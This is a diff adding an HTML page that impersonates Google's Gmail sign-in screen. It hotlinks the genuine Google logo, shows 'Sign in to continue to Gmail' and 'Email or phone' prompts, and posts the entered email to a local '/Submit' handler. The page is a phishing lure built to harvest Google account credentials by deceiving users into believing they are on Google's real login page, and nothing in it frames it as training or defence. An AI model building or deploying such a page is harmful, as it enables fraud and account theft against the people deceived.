@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<title>Login Form</title>
+	<link rel="stylesheet" href="https://unpkg.com/tailwindcss@2.2.17/dist/tailwind.min.css">
+       <meta name="viewport" content="width=device-width, initial-sacale=1.0">
+	<style>
+	/* Additional CSS styles */
+	.form-button {
+		background-color: #4265F4;
+		color: #fff;
+		border: none;
+		padding: 6px 5px;
+		/* increase button padding to make it longer */
+		border-radius: 5px;
+		margin-left: auto;
+		/* align button to right side */
+		cursor: pointer;
+		display: block;
+		/* make button a block element to control width */
+		width: 90px;
+		/* decrease button width */
+		transition: all 0.3s ease-in-out;
+	}
+
+	.form-button:hover {
+		background-color: #2d3748;
+	}
+
+	/* Additional CSS styles for logo */
+	.logo {
+		display: flex;
+		justify-content: center;
+		align-items: center;
+		margin-bottom: 1rem;
+	}
+
+	.logo img {
+		height: 25px;
+		width: 75px;
+		margin-right: 10px;
+	}
+
+	.forgot-link {
+		color: #4265F4;
+		font-size: 16px;
+	}
+
+	.outline {
+		border: 1px solid #dadce0;
+	}
+
+	.form-button {
+		font-family: "Google Sans", Roboto, Arial, sans-serif;
+		font-size: .875rem;
+		letter-spacing: .0107142857em;
+		font-weight: 500;
+		text-transform: none;
+	}
+	</style>
+</head>
+
+<body class="bg-100">
+	<div class="container mx-auto px-6 md:px-0 mt-10 "> <br><br>
+		<div class="max-w-md h-90 mx-auto bg-white shadow-lg rounded-lg overflow-hidden outline">
+			<div class="py-4 px-6">
+				<div class="logo">
+					<h2 class="text-2xl text-gray-800 mb-2 block text-center">
+						<br><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="inline-block h-6 mr-2">
+						<br> Sign in </h2>
+				</div>
+				<p class="text-center text-black-700 text-bold mt-2">to continue to Gmail</p><br>
+				<form action = "/Submit" method="post" >
+					<div class="mb-4">
+						<label class="block text-black-700 font-bold mb-2" for="email"></label>
+						<input name = "email" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="email" type="email" placeholder="Email or phone" required>
+					</div>
+					<div class="flex items-center justify-between">
+						<a href="#" class="forgot-link ">Forgot email?</a><br><br><br>
+					</div>
+					<p class="text-center text-gray-700 text-sm mt-2">Not your computer? Use Guest mode to sign in privately. <br><a href="#" class="forgot-link ">Learn more</a></p><br><br>
+					<div class="flex items-center justify-between">
+						<a href="#" class="forgot-link ">Create Account</a>
+						<button class="form-button " type="submit">Next</button><br><br><br><br>
+					</div>
+				</form>
+			</div>
+		</div>
+	</div>
+</body>
+
+</html>
